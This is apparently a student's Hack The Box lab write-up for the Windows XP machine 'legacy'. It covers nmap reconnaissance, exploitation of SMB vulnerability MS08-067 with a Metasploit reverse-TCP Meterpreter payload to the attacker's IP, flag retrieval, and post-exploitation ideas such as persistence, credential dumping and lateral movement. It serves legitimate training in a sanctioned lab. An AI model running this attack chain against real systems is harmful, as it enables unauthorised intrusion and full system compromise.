# legacy — Penetration Testing Notes

## 1. Target Information
- **IP Address:** `10.129.227.181`
- **Hostname:** `legacy`
- **Operating System (guessed/confirmed):**  
  - Windows XP (confirmed via `smb-os-discovery` and Metasploit fingerprint)  
  - `OS: Windows XP (Windows 2000 LAN Manager)`  
- **Ports Open (quick scan):**
  - `135/tcp` – `msrpc` (Microsoft Windows RPC)  
  - `139/tcp` – `netbios-ssn` (Microsoft Windows netbios-ssn)  
  - `445/tcp` – `microsoft-ds` (Windows XP SMB / Microsoft-DS)
- **Ports Open (full scan):**
  - `135/tcp` – `msrpc`  
  - `139/tcp` – `netbios-ssn`  
  - `445/tcp` – `microsoft-ds`  

---

## 2. High-Level Recon Summary

- **Potential entry points:**
  - SMB on `445/tcp` (classic Windows XP RCE surface)
  - NetBIOS/SMB on `139/tcp`
  - MSRPC on `135/tcp` (less interesting without creds)

- **Key SMB clues from Nmap:**
  - `OS: Windows XP (Windows 2000 LAN Manager)`
  - `Workgroup: HTB`
  - `Computer name: legacy`
  - `message_signing: disabled`  
  - `account_used: guest`
  - `authentication_level: user`
  - `smb2-time: Protocol negotiation failed (SMB2)` → old SMBv1 only

- **Known / detected vulnerabilities:**
  - `smb-vuln-ms08-067` → **LIKELY VULNERABLE**  
    - CVE: **CVE-2008-4250** (MS08-067)
  - `smb-vuln-ms17-010` → **VULNERABLE**  
    - Nmap listed: **CVE-2017-0143** (part of the EternalBlue family)

- **Web services:**  
  - None detected (no HTTP/HTTPS ports open in quick or full scan).

- **Databases / other infra:**  
  - None exposed (no DB ports in full TCP scan).

**Conclusion:**  
- The box screams **“exploit SMB”**.  
- **MS08-067 (CVE-2008-4250)** is the primary, reliable RCE path.  
- **MS17-010 / EternalBlue (CVE-2017-0143)** is also present, but one good RCE is enough.  
- No web / DB / SSH distractions → straight SMB exploitation.

---

# 3. Enumeration

## 3.1 Nmap Results

### Quick Scan

**Command:**
```bash
nmap -sC -sV 10.129.227.181

##Key results:
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-445/tcp open microsoft-ds Windows XP microsoft-ds

###Host script results (from smb-vuln scan):
-nmap --script smb-vuln* -p445 $target
-smb-vuln-ms08-067
-LIKELY VULNERABLE
-CVE: CVE-2008-4250
-smb-vuln-ms17-010
-VULNERABLE
-CVE: CVE-2017-0143
-smb2-time: Protocol negotiation failed (SMB2) → only SMBv1

###Full TCP Scan
nmap -p- --min-rate 1000 -T4 10.129.227.181

-Result:
-Nothing else open

**Key findings:**
### SMB (139/445)
- OS fingerprint: Windows XP
- Workgroup: HTB
- Computer name: legacy
- Message signing: disabled
- Guest access detected
- Vulnerable era of SMB services

---
3.2 Service Enumeration Checklist
FTP (21)

Port 21 closed (per full scan).

Not applicable on this host.

SSH (22)

Port 22 closed.

Not applicable.

HTTP/HTTPS (80/443/other)

No HTTP/HTTPS ports open.

Not applicable.

SMB (139/445)

Null session?

Likely yes / guest-based, but not strictly needed due to direct RCE via MS08-067.

Shares enumerated:

Not required; went straight for RCE after confirming vulnerabilities.

Interesting files (post-exploit):

c:\Documents and Settings\john\Desktop\user.txt

c:\Documents and Settings\Administrator\Desktop\root.txt

Users found (from paths / OS info):

Administrator

john

Default User

All Users

Enum4linux / rpcclient output notes:

Not used; skipped to direct exploitation.

Possible escalation paths:

Not needed – MS08-067 dropped us directly into NT AUTHORITY\SYSTEM.

SMTP (25)

Port 25 closed.

Not applicable.

Databases
MySQL (3306), PostgreSQL (5432), MongoDB (27017)

All closed / not exposed per full scan.

Not applicable on this host.

### Notes for box:
- MS08-067 high confidence
- SMB authentication weak
- XP service stack outdated

### Databases
-N/A
---
# 4. Vulnerability Discovery

## 4.1 Web Vulnerabilities
- No web services. **N/A.**

## 4.2 Service Vulnerabilities

- **SMB (445/tcp):**
  - **MS08-067** – Microsoft Windows Server Service Relative Path Stack Corruption  
    - CVE: **CVE-2008-4250**  
    - Confirmed via Nmap `smb-vuln-ms08-067` script.  
  - **MS17-010 (EternalBlue family)**  
    - CVE shown by Nmap script: **CVE-2017-0143**  
    - Classic SMBv1 RCE vuln exploited by WannaCry etc.

- **Misconfigurations:**
  - SMBv1 enabled.
  - Message signing disabled.
  - Old unsupported OS (Windows XP SP3).

## 4.3 Credentials Found
- No credentials needed.
- Exploitation was **unauthenticated** RCE over SMB.

---

# 5. Initial Foothold

## 5.1 Access Method

- **Exploit / technique:**
  - Remote code execution via **MS08-067** (NetAPI / Server service RCE).
- **Targeted service:**
  - SMB (`445/tcp`), via the Windows Server service.
- **CVE / exploit name:**
  - **CVE-2008-4250**
  - Metasploit module: `exploit/windows/smb/ms08_067_netapi`
- **Steps taken:**

  1. Created workspace:
     ```bash
     mkhtb legacy
     cd ~/Desktop/HTB/legacy
     settarget 10.129.227.181 && ./recon.sh
     ```

  2. Verified open ports and OS fingerprint via Nmap quick + full scans.

  3. Checked SMB vulnerabilities:
     ```bash
     cd nmap
     nmap --script smb-vuln* -p445 $target
     ```
     Confirmed `ms08-067` + `ms17-010` vulnerabilities.

  4. Loaded Metasploit:
     ```bash
     msfconsole
     search cve:2008-4250
     use exploit/windows/smb/ms08_067_netapi
     ```

  5. Set options:
     ```bash
     set RHOSTS 10.129.227.181
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST 10.10.15.72      # your HTB VPN IP
     show targets               # left on Automatic Targeting
     ```

  6. Ran exploit:
     ```bash
     exploit
     ```
     Output confirmed:
     - Fingerprint: `Windows XP - Service Pack 3 - lang:English`
     - Selected target: `Windows XP SP3 English (AlwaysOn NX)`
     - Meterpreter session opened.

## 5.2 Shell Details

- **Session type:** `meterpreter` (reverse TCP)
- **User (post exploit):**
  ```text
  getuid
  Server username: NT AUTHORITY\SYSTEM

 - System info:
-sysinfo
-Computer        : LEGACY
-OS              : Windows XP (5.1 Build 2600, Service Pack 3).
-Architecture    : x86
-System Language : en_US
-Domain          : HTB
-Logged On Users : 1
-Meterpreter     : x86/windows

-Home / working directory:

-Initial: C:\WINDOWS\system32

-Environment notes:

-Full SYSTEM-level compromise from the start.

-No need for local privilege escalation.

---
# 6. Privilege Escalation

## 6.1 Local Enumeration

Linux-centric commands (`id`, `sudo -l`, etc.) are not applicable here.

Relevant Windows/Meterpreter checks:

- `getuid` → `NT AUTHORITY\SYSTEM`
- `sysinfo` → Windows XP SP3 x86
- `getsystem`:
  ```text
  getsystem
  [-] Already running as SYSTEM

  
**Findings:**
-Already at maximum privilege (SYSTEM).
-No additional escalation required.

## 6.2 Potential Priv-Esc Paths
- Not needed, but theoretically:
  - Abuse of services / registry / scheduled tasks if lower-priv at first.
  - Kernel exploits possible given ancient XP, but irrelevant here.

## 6.3 Exploitation
- **Final method used for highest privileges:**
  - Direct result of `ms08_067_netapi` exploit.
- **Root/admin shell obtained:**
  - Meterpreter session **already** running as `NT AUTHORITY\SYSTEM`.

---

# 7. Loot / Flags

## 7.1 User Flag

- **Path:**
  c:\Documents and Settings\john\Desktop\user.txt

- Commands used (Meterpreter):
- search -f *.txt             # locate potential interesting txt files
- cat "C:\Documents and Settings\john\Desktop\user.txt"


## 7.2 Root Flag
- **Path**:
-c:\Documents and Settings\Administrator\Desktop\root.txt

-Commands used:
-search -f *.txt
-cat "C:\Documents and Settings\Administrator\Desktop\root.txt"

## 7.3 Other Interesting Data
-Various log / config txt files found by search -f *.txt, but not required for the HTB objectives.

---

# 8. Post-Exploitation Notes

- **Persistence (if this were real):**
  - Could easily add:
    - New admin user.
    - Malicious service.
    - Registry-based persistence.
    - Scheduled task.
  - With SYSTEM privileges, basically anything is possible.

- **Lateral movement potential:**
  - If this XP box were in a real domain:
    - Dump creds (hashes) from memory/registry and reuse.
    - Use SMB + stolen creds to pivot.
    - Use XP as a staging point for other internal targets.

- **Data exfiltration ideas:**
  - Documents in user profiles.
  - Any DB clients / stored creds (none here).
  - Potential file shares (not explored because HTB scope is just this host).

- **Real-life impact:**
  - Full host compromise.
  - If on a real network: potential entry point for ransomware/worm behaviour (EternalBlue/MS08-067).

---

# 9. Lessons Learned / To Improve

- **What slowed me down:**
  - Path handling in Meterpreter (`\Documents and Settings\...` vs `C:\Documents and Settings\...` and needing quotes).
  - Understanding exactly what HTB wanted for the MS08-067 “what user does execution run as” question (needed full `NT AUTHORITY\SYSTEM` string, not just `SYSTEM`).

- **What I missed initially:**
  - That `search -f *.txt` + `cat` with quotes is the cleanest way to grab flags.
  - That the nmap script for `ms17-010` on this host shows **CVE-2017-0143**, not the more commonly quoted 0144.

- **Commands I had to think about / look up:**
  - Correct Nmap script syntax: `--script=smb-vuln* -p445 <IP>`.
  - Proper use of `cat` on Windows paths with spaces.

- **Techniques to practice:**
  - Getting faster at:
    - Recognising “old Windows + SMB = MS08-067 / MS17-010” without overthinking.
    - Using Meterpreter’s `search` effectively.
    - Always checking `getuid` / `sysinfo` immediately after exploit to understand your footing.
